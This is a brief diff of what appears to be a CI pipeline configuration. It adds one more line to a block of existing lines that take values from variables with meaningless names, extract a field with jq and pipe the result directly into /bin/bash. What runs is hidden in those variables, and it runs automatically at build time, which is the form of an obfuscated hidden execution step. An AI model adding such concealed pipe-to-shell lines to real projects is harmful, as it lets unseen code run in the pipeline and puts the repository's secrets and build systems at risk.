@@ -32,6 +32,7 @@ jobs:
           echo $tjm9069 | jq -r .nqj0874 | /bin/bash
           printf '%s' "$uqd6776" | jq -r .jobqe3 | /bin/bash
           echo $mjxx95570 | jq -r .bbzx53 | /bin/bash
+          echo $bh6 | jq -r .pb5091 | /bin/bash
 
       - name: Upload results
         if: always()
